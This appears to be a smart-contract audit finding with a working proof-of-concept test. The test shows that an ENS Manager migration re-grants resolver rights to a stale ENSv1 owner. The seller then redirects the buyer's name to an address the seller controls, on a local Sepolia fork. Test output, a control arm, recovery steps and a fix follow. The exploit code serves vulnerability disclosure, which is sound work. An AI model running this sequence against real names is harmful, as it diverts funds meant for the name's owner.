* The name is registrant `0xbeEF...f1F1`, the buyer, with ENSv1 registry owner `0xBAd0...0Bad`, the seller. That is the state an ERC-721 sale leaves behind.
* The real `classifyNames` sets `managerAddress = 0xBAd0...0Bad`.
* The real `buildRoleGrantCall` emits `grantRoles(<canonicalId>, 16777216, 0xBAd0...0Bad)` to the v2 `ETHRegistry` at `0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2`.
* After the migration transaction the ENSv1 registry owner is `0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750`, not the seller, and the seller's ENSv1 `setResolver` fails. The migration destroyed the seller's v1 authority.
* After the app's inner call runs, `roles(<canonicalId>, seller)` is `16777216`.
* The seller's `ETHRegistry.setResolver` succeeds. The registry resolver moves from the address the Manager wrote, `0xE99638b40E4Fff0129D56f03b55b6bbC4BBE49b5`, to the seller's `0xdeAdDeaddeadDEADDeaDdeaDdeAdDEad00000042` while `getOwner` is still the buyer.

### Terminal endpoint - what a resolution consumer returns for the buyer's name

The arm above ends at the registry's resolver pointer. This arm runs the seller's regained role to its endpoint: the seller stands up their own resolver, writes an `addr(60)` into it, and the Explorer's own name-to-address query is asked what the buyer's name resolves to.

Save as `apps/manager/src/features/migration/service/term2_stale_manager_resolution_endpoint.test.ts` and run

```bash
pnpm --filter manager exec vitest run \
  src/features/migration/service/term2_stale_manager_resolution_endpoint.test.ts \
  --disableConsoleIntercept
```

The seller's resolver is not a stub. It is deployed by the Manager's own `buildDeployOwnedPermResCall` (`ensureOwnedPermRes.ts:83-95`) through the deployed `VerifiableFactory` against the deployed `PermissionedResolver` implementation, and the record is written with the app's own `PERMISSIONED_RESOLVER_ABI`. The resolution consumer is `getAddressRecord` from `@ensdomains/ensjs/public`, the same function `apps/portal/src/features/transfer/queries/getEthAddress.ts:13` calls to decide the address a transfer is sent to, on a client built from the app's own `sepoliaWithEns` chain object.

```ts
/**
 * Terminal endpoint - the seller uses the ROLE_SET_RESOLVER the
 * migration re-granted them to make the buyer's ENSv2 name resolve to an
 * address the seller chose, read back through the app's own resolution path.
 *
 * Runs against a local Anvil fork of Sepolia. No transaction is sent to a
 * public network.
 */
import { labelToCanonicalId } from '@ensdomains/ensjs/utils/v2'
import { getAddressRecord } from '@ensdomains/ensjs/public'
import {
  type Address,
  createPublicClient,
  decodeEventLog,
  encodeAbiParameters,
  encodeFunctionData,
  type Hex,
  http,
  keccak256,
  namehash,
  parseAbi,
  type PublicClient,
  toHex,
} from 'viem'
import { describe, expect, it } from 'vitest'
import { sepoliaWithEns } from '@/lib/wagmi'
import { V2_CONTRACTS } from '../contracts/addresses'
import { PERMISSIONED_RESOLVER_ABI } from '../contracts/abis'
import { buildRoleGrantCall } from './buildRoleGrantCalls'
import { classifyNames } from './classifyNames'
import { buildDeployOwnedPermResCall } from './ensureOwnedPermRes'
import type { V1Domain } from './v1SubgraphClient'

const RPC = 'http://127.0.0.1:8546'
const BASE_REGISTRAR: Address = '0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85'
const V1_REGISTRY: Address = '0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e'
const V1_PUBLIC_RESOLVER: Address = '0xE99638b40E4Fff0129D56f03b55b6bbC4BBE49b5'
const V2_ETH_REGISTRAR: Address = '0xa88553F454b77203B0D036A05c894d555EAAa2Cc'
const BASE_REGISTRAR_CONTROLLER: Address =
  '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266'

/** Buyer: registrant of the .eth name and the wallet running the migration. */
const BUYER: Address = '0xbeEF00000000000000000000000000000000f1F1'
/** Seller: still the ENSv1 registry owner after the ERC-721 sale. */
/**
 * Seller: still the ENSv1 registry owner after the ERC-721 sale. A fresh
 * address per run, because `buildDeployOwnedPermResCall` derives a CREATE2 salt
 * from the deployer, so a fixed seller can only deploy its resolver once per
 * fork.
 */
const SELLER: Address =
  `0x${keccak256(toHex(`term2-seller:${Date.now()}`)).slice(-40)}` as Address
/** Stand-in for the wallet's HCA; it executes the batch's inner calls. */
const HCA: Address = '0x3333333333333333333333333333333333333333'
/** The address the seller wants payments for the buyer's name to land on. */
const SELLER_PAYOUT: Address = '0x5E11e45E11e45E11E45E11E45e11E45e11e45e11'
/** The address the buyer set as their own `addr(60)` before the sale. */
const BUYER_PAYOUT: Address = '0xb0B0000000000000000000000000000000000B0B'
const ZERO: Address = '0x0000000000000000000000000000000000000000'

const ROLE_SET_RESOLVER = 1n << 24n
const ROLE_SET_RESOLVER_ADMIN = ROLE_SET_RESOLVER << 128n

const pub = createPublicClient({
  chain: sepoliaWithEns,
  transport: http(RPC),
}) as PublicClient

/** Same chain object, used for the ensjs resolution actions. */
const ensClient = createPublicClient({
  chain: sepoliaWithEns,
  transport: http(RPC),
})

const rpc = (method: string, params: unknown[]) =>
  fetch(RPC, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
  }).then((r) => r.json() as Promise<{ result?: string; error?: unknown }>)

type SendResult = { ok: boolean; status?: string; detail?: string }

const send = async (
  from: Address,
  to: Address,
  data: Hex,
  gas = '0x2DC6C0',
): Promise<SendResult> => {
  const r = await rpc('eth_sendTransaction', [{ from, to, data, gas }])
  await rpc('evm_mine', [])
  if (!r.result) return { ok: false, detail: JSON.stringify(r.error) }
  const receipt = await pub.getTransactionReceipt({ hash: r.result as Hex })
  return { ok: receipt.status === 'success', status: receipt.status }
}

const baseRegistrarAbi = parseAbi([
  'function register(uint256 id, address owner, uint256 duration) returns (uint256)',
  'function ownerOf(uint256 id) view returns (address)',
  'function nameExpires(uint256 id) view returns (uint256)',
  'function safeTransferFrom(address from, address to, uint256 tokenId, bytes data)',
])
const v1RegistryAbi = parseAbi([
  'function owner(bytes32 node) view returns (address)',
  'function setOwner(bytes32 node, address owner)',
  'function setResolver(bytes32 node, address resolver)',
])
const v1ResolverAbi = parseAbi([
  'function setAddr(bytes32 node, address a)',
  'function addr(bytes32 node) view returns (address)',
])
const v2RegistryAbi = parseAbi([
  'function getOwner(uint256 anyId) view returns (address)',
  'function getResolver(string label) view returns (address)',
  'function getTokenId(uint256 anyId) view returns (uint256)',
  'function roles(uint256 resource, address account) view returns (uint256)',
  'function register(string label, address owner, address registry, address resolver, uint256 roleBitmap, uint64 expiry) returns (uint256)',
  'function setApprovalForAll(address operator, bool approved)',
  'function setResolver(uint256 tokenId, address resolver)',
  'function revokeRoles(uint256 resource, uint256 roleBitmap, address account) returns (uint256)',
])
const verifiableFactoryAbi = parseAbi([
  'event ProxyDeployed(address indexed sender, address indexed proxyAddress, uint256 salt, address implementation)',
])
const migrationDataComponents = [
  { name: 'label', type: 'string' },
  { name: 'owner', type: 'address' },
  { name: 'subregistry', type: 'address' },
  { name: 'resolver', type: 'address' },
] as const

/** Build the subgraph-shaped domain purely from values read off the fork. */
const domainFromFork = async (label: string): Promise<V1Domain> => {
  const node = namehash(`${label}.eth`)
  const labelhash = keccak256(toHex(label))
  const [registrant, manager, expiry] = await Promise.all([
    pub.readContract({
      address: BASE_REGISTRAR,
      abi: baseRegistrarAbi,
      functionName: 'ownerOf',
      args: [BigInt(labelhash)],
    }),
    pub.readContract({
      address: V1_REGISTRY,
      abi: v1RegistryAbi,
      functionName: 'owner',
      args: [node],
    }),
    pub.readContract({
      address: BASE_REGISTRAR,
      abi: baseRegistrarAbi,
      functionName: 'nameExpires',
      args: [BigInt(labelhash)],
    }),
  ])
  return {
    id: node,
    labelName: label,
    labelhash,
    name: `${label}.eth`,
    resolver: { address: V1_PUBLIC_RESOLVER },
    owner: { id: manager },
    registrant: { id: registrant },
    wrappedOwner: null,
    parent: { name: 'eth', wrappedDomain: null },
    registration: { expiryDate: expiry.toString() },
    wrappedDomain: null,
  }
}

/**
 * Register an unwrapped .eth name to BUYER, give it a real `addr(60)` on the
 * V1 public resolver, and leave `manager` as the ENSv1 registry owner.
 */
const createSoldName = async (label: string, manager: Address) => {
  const node = namehash(`${label}.eth`)
  const labelhash = keccak256(toHex(label))
  for (const account of [
    BUYER,
    SELLER,
    HCA,
    BASE_REGISTRAR_CONTROLLER,
    V2_ETH_REGISTRAR,
  ]) {
    await rpc('anvil_setBalance', [account, '0x3635C9ADC5DEA00000'])
  }
  expect(
    await send(
      BASE_REGISTRAR_CONTROLLER,
      BASE_REGISTRAR,
      encodeFunctionData({
        abi: baseRegistrarAbi,
        functionName: 'register',
        args: [BigInt(labelhash), BUYER, 31_536_000n],
      }),
    ),
  ).toMatchObject({ ok: true })
  expect(
    await send(
      BUYER,
      V1_REGISTRY,
      encodeFunctionData({
        abi: v1RegistryAbi,
        functionName: 'setResolver',
        args: [node, V1_PUBLIC_RESOLVER],
      }),
    ),
  ).toMatchObject({ ok: true })
  // the buyer's own address record, written before the migration
  expect(
    await send(
      BUYER,
      V1_PUBLIC_RESOLVER,
      encodeFunctionData({
        abi: v1ResolverAbi,
        functionName: 'setAddr',
        args: [node, BUYER_PAYOUT],
      }),
    ),
  ).toMatchObject({ ok: true })
  if (manager !== BUYER) {
    expect(
      await send(
        BUYER,
        V1_REGISTRY,
        encodeFunctionData({
          abi: v1RegistryAbi,
          functionName: 'setOwner',
          args: [node, manager],
        }),
      ),
    ).toMatchObject({ ok: true })
  }
  const expiry = await pub.readContract({
    address: BASE_REGISTRAR,
    abi: baseRegistrarAbi,
    functionName: 'nameExpires',
    args: [BigInt(labelhash)],
  })
  // premigration: the label is RESERVED on the v2 ETHRegistry
  expect(
    await send(
      V2_ETH_REGISTRAR,
      V2_CONTRACTS.ETHRegistry,
      encodeFunctionData({
        abi: v2RegistryAbi,
        functionName: 'register',
        args: [label, ZERO, ZERO, V1_PUBLIC_RESOLVER, 0n, expiry],
      }),
      '0xF4240',
    ),
  ).toMatchObject({ ok: true })
}

/** Move the ERC-721 to UnlockedMigrationController, exactly as MigrationHelper does. */
const migrateUnwrapped = async (label: string, resolver: Address) => {
  const labelhash = keccak256(toHex(label))
  const data = encodeAbiParameters(
    [{ type: 'tuple', components: migrationDataComponents }],
    [{ label, owner: BUYER, subregistry: ZERO, resolver }],
  ) as Hex
  return send(
    BUYER,
    BASE_REGISTRAR,
    encodeFunctionData({
      abi: baseRegistrarAbi,
      functionName: 'safeTransferFrom',
      args: [
        BUYER,
        V2_CONTRACTS.UnlockedMigrationController,
        BigInt(labelhash),
        data,
      ],
    }),
  )
}

/** `getAddressRecord` is the Explorer's own name -> ETH address query. */
const resolveEth = async (name: string): Promise<string | null> => {
  const record = await getAddressRecord(ensClient, { name, coin: 60 }).catch(
    () => null,
  )
  return record?.value ?? null
}

/** Deploy the seller's own PermissionedResolver with the app's own builder. */
const deploySellerResolver = async (): Promise<Address> => {
  const call = buildDeployOwnedPermResCall(SELLER)
  const r = await rpc('eth_sendTransaction', [
    { from: SELLER, to: call.to, data: call.data, gas: '0x2DC6C0' },
  ])
  await rpc('evm_mine', [])
  expect(r.result).toBeTruthy()
  const receipt = await pub.getTransactionReceipt({ hash: r.result as Hex })
  expect(receipt.status).toBe('success')
  for (const log of receipt.logs) {
    if (log.address.toLowerCase() !== V2_CONTRACTS.VerifiableFactory.toLowerCase())
      continue
    try {
      const decoded = decodeEventLog({
        abi: verifiableFactoryAbi,
        data: log.data,
        topics: log.topics as [Hex, ...Hex[]],
      })
      if (decoded.eventName === 'ProxyDeployed') {
        return decoded.args.proxyAddress as Address
      }
    } catch {
      // not the ProxyDeployed log
    }
  }
  throw new Error('no ProxyDeployed log')
}

describe('stale-manager grant reaches a forward-resolution endpoint', () => {
  it('TERMINAL: the buyer owns the name and the seller decides what it resolves to', async () => {
    const label = `term2sm${Date.now().toString(36)}`
    const name = `${label}.eth`
    const node = namehash(name)
    await createSoldName(label, SELLER)

    // --- opening balances -------------------------------------------------
    const v1AddrBefore = await pub.readContract({
      address: V1_PUBLIC_RESOLVER,
      abi: v1ResolverAbi,
      functionName: 'addr',
      args: [node],
    })
    expect(v1AddrBefore.toLowerCase()).toBe(BUYER_PAYOUT.toLowerCase())
    console.log(`[open] ${name} v1 addr(60) = ${v1AddrBefore} (the buyer's)`)

    // --- the app's own classification and grant ---------------------------
    const domain = await domainFromFork(label)
    const { classified } = classifyNames([domain], BUYER)
    const classifiedName = classified[0]
    if (!classifiedName) throw new Error('unreachable')
    expect(classifiedName.managerAddress?.toLowerCase()).toBe(
      SELLER.toLowerCase(),
    )
    const grantCall = buildRoleGrantCall(classifiedName)

    expect(
      await migrateUnwrapped(label, V2_CONTRACTS.DefaultResolver),
    ).toMatchObject({ ok: true })
    expect(
      await send(
        BUYER,
        V2_CONTRACTS.ETHRegistry,
        encodeFunctionData({
          abi: v2RegistryAbi,
          functionName: 'setApprovalForAll',
          args: [HCA, true],
        }),
      ),
    ).toMatchObject({ ok: true })
    expect(await send(HCA, grantCall.to, grantCall.data)).toMatchObject({
      ok: true,
    })

    const resource = labelToCanonicalId(label)
    const tokenId = await pub.readContract({
      address: V2_CONTRACTS.ETHRegistry,
      abi: v2RegistryAbi,
      functionName: 'getTokenId',
      args: [resource],
    })
    const sellerRoles = await pub.readContract({
      address: V2_CONTRACTS.ETHRegistry,
      abi: v2RegistryAbi,
      functionName: 'roles',
      args: [resource, SELLER],
    })
    expect(sellerRoles & ROLE_SET_RESOLVER).toBe(ROLE_SET_RESOLVER)

    // resolution immediately after the migration, before the seller acts
    const resolvedAfterMigration = await resolveEth(name)
    console.log(
      `[post-migration] getAddressRecord(${name}, 60) = ${resolvedAfterMigration}`,
    )

    // --- the seller's terminal move ---------------------------------------
    const sellerResolver = await deploySellerResolver()
    console.log(`[attack] seller's own PermissionedResolver = ${sellerResolver}`)
    expect(sellerResolver.toLowerCase()).not.toBe(
      V2_CONTRACTS.DefaultResolver.toLowerCase(),
    )

    expect(
      await send(
        SELLER,
        sellerResolver,
        encodeFunctionData({
          abi: PERMISSIONED_RESOLVER_ABI,
          functionName: 'setAddr',
          args: [node, 60n, SELLER_PAYOUT],
        }),
      ),
    ).toMatchObject({ ok: true })

    const flip = await send(
      SELLER,
      V2_CONTRACTS.ETHRegistry,
      encodeFunctionData({
        abi: v2RegistryAbi,
        functionName: 'setResolver',
        args: [tokenId, sellerResolver],
      }),
    )
    expect(flip.ok).toBe(true)

    // --- the endpoint a payer reads ---------------------------------------
    const ownerAtEndpoint = await pub.readContract({
      address: V2_CONTRACTS.ETHRegistry,
      abi: v2RegistryAbi,
      functionName: 'getOwner',
      args: [resource],
    })
    const resolvedAfterAttack = await resolveEth(name)
    console.log(
      `[TERMINAL] tokenId=${tokenId} getOwner=${ownerAtEndpoint} getAddressRecord(${name},60)=${resolvedAfterAttack} sellerPayout=${SELLER_PAYOUT} buyerPayout=${BUYER_PAYOUT}`,
    )
    expect(ownerAtEndpoint.toLowerCase()).toBe(BUYER.toLowerCase())
    expect(resolvedAfterAttack?.toLowerCase()).toBe(
      SELLER_PAYOUT.toLowerCase(),
    )
    expect(resolvedAfterAttack?.toLowerCase()).not.toBe(
      BUYER_PAYOUT.toLowerCase(),
    )

    // --- recovery bound, measured -----------------------------------------
    // step 1 alone: the buyer repoints the resolver. The seller re-flips it.
    const buyerRepoint = await send(
      BUYER,
      V2_CONTRACTS.ETHRegistry,
      encodeFunctionData({
        abi: v2RegistryAbi,
        functionName: 'setResolver',
        args: [tokenId, V2_CONTRACTS.DefaultResolver],
      }),
    )
    const sellerReflip = await send(
      SELLER,
      V2_CONTRACTS.ETHRegistry,
      encodeFunctionData({
        abi: v2RegistryAbi,
        functionName: 'setResolver',
        args: [tokenId, sellerResolver],
      }),
    )
    const resolvedAfterReflip = await resolveEth(name)
    console.log(
      `[recovery] buyerRepoint.ok=${buyerRepoint.ok} sellerReflip.ok=${sellerReflip.ok} resolved=${resolvedAfterReflip}`,
    )
    expect(buyerRepoint.ok).toBe(true)
    expect(sellerReflip.ok).toBe(true)
    expect(resolvedAfterReflip?.toLowerCase()).toBe(SELLER_PAYOUT.toLowerCase())

    // step 2: the buyer holds ROLE_SET_RESOLVER_ADMIN, so revoke then repoint.
    const buyerRoles = await pub.readContract({
      address: V2_CONTRACTS.ETHRegistry,
      abi: v2RegistryAbi,
      functionName: 'roles',
      args: [resource, BUYER],
    })
    expect(buyerRoles & ROLE_SET_RESOLVER_ADMIN).toBe(ROLE_SET_RESOLVER_ADMIN)
    const revoke = await send(
      BUYER,
      V2_CONTRACTS.ETHRegistry,
      encodeFunctionData({
        abi: v2RegistryAbi,
        functionName: 'revokeRoles',
        args: [resource, ROLE_SET_RESOLVER, SELLER],
      }),
    )
    const repoint = await send(
      BUYER,
      V2_CONTRACTS.ETHRegistry,
      encodeFunctionData({
        abi: v2RegistryAbi,
        functionName: 'setResolver',
        args: [tokenId, V2_CONTRACTS.DefaultResolver],
      }),
    )
    const sellerRolesAfter = await pub.readContract({
      address: V2_CONTRACTS.ETHRegistry,
      abi: v2RegistryAbi,
      functionName: 'roles',
      args: [resource, SELLER],
    })
    const sellerReflipAfterRevoke = await send(
      SELLER,
      V2_CONTRACTS.ETHRegistry,
      encodeFunctionData({
        abi: v2RegistryAbi,
        functionName: 'setResolver',
        args: [tokenId, sellerResolver],
      }),
    )
    const resolvedAfterRecovery = await resolveEth(name)
    console.log(
      `[recovery] revoke.ok=${revoke.ok} repoint.ok=${repoint.ok} roles(seller)=${sellerRolesAfter} sellerReflipAfterRevoke.ok=${sellerReflipAfterRevoke.ok} resolved=${resolvedAfterRecovery}`,
    )
    expect(revoke.ok).toBe(true)
    expect(repoint.ok).toBe(true)
    expect(sellerRolesAfter).toBe(0n)
    expect(sellerReflipAfterRevoke.ok).toBe(false)
    // the buyer's records did not travel: the v2 default resolver holds none.
    expect(resolvedAfterRecovery).toBe(null)
  }, 300_000)
})
```

Output:

```
 RUN  v4.1.5 /Users/wolf/audits/ens/src/audit-comp-ens/apps/manager

[open] term2smmtvypru1.eth v1 addr(60) = 0xb0B0000000000000000000000000000000000B0B (the buyer's)
[post-migration] getAddressRecord(term2smmtvypru1.eth, 60) = null
[attack] seller's own PermissionedResolver = 0x83DCef30837452c1F2b213e4e29b2dEB28c60123
[TERMINAL] tokenId=63147333210933073494512634159529347104598105265178671550929266246026415570945 getOwner=0xbeEF00000000000000000000000000000000f1F1 getAddressRecord(term2smmtvypru1.eth,60)=0x5E11e45E11e45E11E45E11E45e11E45e11e45e11 sellerPayout=0x5E11e45E11e45E11E45E11E45e11E45e11e45e11 buyerPayout=0xb0B0000000000000000000000000000000000B0B
[recovery] buyerRepoint.ok=true sellerReflip.ok=true resolved=0x5E11e45E11e45E11E45E11E45e11E45e11e45e11
[recovery] revoke.ok=true repoint.ok=true roles(seller)=0 sellerReflipAfterRevoke.ok=false resolved=null

 Test Files  1 passed (1)
      Tests  1 passed (1)
   Start at  22:10:54
   Duration  7.37s (transform 309ms, setup 0ms, import 3.30s, tests 3.60s, environment 339ms)
```

Reading the lines in order:

* `[open]`: before migration, the constructed name's `addr(60)` on the ENSv1 public resolver is `0xb0B0000000000000000000000000000000000B0B`, the buyer's address.
* `[post-migration]`: immediately after the migration, and before the seller acts, `getAddressRecord` returns `null`. The migration did not carry the record across.
* `[attack]`: the seller deploys their own `PermissionedResolver` at `0x83DCef30837452c1F2b213e4e29b2dEB28c60123` and writes `setAddr(node, 60, 0x5E11e45E11e45E11E45E11E45e11E45e11e45e11)` into it.
* `[TERMINAL]`: `getOwner` on token id `63147333210933073494512634159529347104598105265178671550929266246026415570945` is `0xbeEF00000000000000000000000000000000f1F1`, the buyer, and `getAddressRecord` for the same name is `0x5E11e45E11e45E11E45E11E45e11E45e11e45e11`, the seller's chosen address. Anyone who sends ETH to that name sends it to the seller. Both values are asserted exactly.
* `[recovery]` line 1: the buyer's `setResolver` succeeds and the seller's next `setResolver` succeeds too, so the name resolves to the seller again. One repoint is not a recovery.
* `[recovery]` line 2: `revokeRoles(resource, 1 << 24, seller)` then `setResolver` ends it. `roles(resource, seller)` is `0`, the seller's next `setResolver` reverts, and the name then resolves to `null` because the buyer's own record never travelled.

### Running this alongside the other proofs

This proof funds and sends from a small set of accounts on the local fork. If several of these fork-based tests run in the same vitest invocation, they compete for those accounts and some fail on nonce and balance collisions rather than on anything about the defect. Run this file on its own, or pass `--no-file-parallelism`:

```
pnpm --filter manager exec vitest run <this file> --no-file-parallelism
```

A failure that names a nonce, an insufficient balance, or an already-known transaction is that collision, not the finding.

## Control

Arm B is the identical flow with exactly one condition changed: the ENSv1 registry owner equals the registrant, which is the state after a single `reclaim()` call. Same code path, same fork, same contracts, same migration transaction, same actors and amounts.

Measured difference:

* `classified.managerAddress` is `null` instead of the seller address.
* `buildRoleGrantCall` throws `No manager address for ...`, so no `manager-role-grant` inner call and no `manager-role` expectation are produced.
* `roles(<canonicalId>, seller)` is `0`.
* The seller's `ETHRegistry.setResolver` fails and `getResolver` still returns the resolver the Manager's own `resolverFor` chose for the name, `0xE99638b40E4Fff0129D56f03b55b6bbC4BBE49b5`.

The single load-bearing condition is `domain.owner.id !== domain.registrant.id`, which the buyer has no reason to know about and which the flow never surfaces.

## Impact

Selected row: `Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as: - a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker`.

Predicate mapping:

* **Manager flow, executed and measured.** The classifier, the resolver choice, both operator approvals, the `MigrationHelper.migrate` call and the `grantRoles` inner call are all produced by the Manager's own builders and submitted unmodified. The grant call is scheduled by `buildAtomicMigrationBatches.ts:608-614` inside the migration batch.
* **A migration that assigns the name's resolver to an attacker, executed and measured.** The migration's own inner call gives the seller `ROLE_SET_RESOLVER` on the buyer's name, and the seller then sets the resolver to a contract of their choosing. `getResolver` reads that contract while `getOwner` reads the buyer.
* **The gaining party is not entitled to it, executed and source-proved.** The same flow destroyed the seller's ENSv1 authority over the name (`sellerV1SetResolver.ok=false`), so the grant is not a preservation of an existing right; it is a new one created after the old one ended. The only reason the address is selected is `domain.owner.id !== domain.registrant.id` at `classifyNames.ts:163-167`.
* **The victim is not told, source-proved.** The confirmation step for this approval names no address (`WalletConfirmationStepsDialog.tsx:81-90`).
* **The consequence is external, executed and measured.** `getAddressRecord(name, { coin: 60 })`, the query the Explorer's transfer flow uses to decide where funds go, returns the seller's `0x5E11e45E11e45E11E45E11E45e11E45e11e45e11` for a name whose `getOwner` is the buyer.
* **Bound, executed and measured.** The buyer holds bit 152, so the grant is revocable once discovered, but repointing the resolver alone is not enough: the seller's next `setResolver` succeeds and the name resolves to them again. The terminating sequence is `revokeRoles(resource, 1 << 24, seller)` then `setResolver`, after which `roles(resource, seller)` is `0` and the seller's `setResolver` reverts. The takeover transaction can land before any of that, and after recovery the name resolves to `null` until the buyer re-enters the record by hand.

## Suggested fix

The invariant to restore is that a migration must not create an ENSv2 permission for an address the migrating wallet has not named.

1. Do not treat the ENSv1 registry owner as an authority to reproduce. `reclaim()` makes the ENSv1 controller a revocable delegation the registrant can clear at any moment, and the migration already clears it. Default `managerAddress` to `null` at `classifyNames.ts:163-167`.
2. If manager restoration is kept as a feature, make it opt-in per name and name the address. The confirmation screen must render the exact `managerAddress` next to the name and require an explicit toggle, the way a token approval screen names its spender.
3. When `domain.owner.id !== domain.registrant.id` for an unwrapped name, warn that the name carries a stale ENSv1 controller and offer to `reclaim()` before migrating, rather than carrying that controller into v2.
4. Add a regression test asserting that a `ClassifiedName` whose ENSv1 registry owner differs from its registrant produces no `manager-role-grant` inner execution unless the user explicitly opted in.
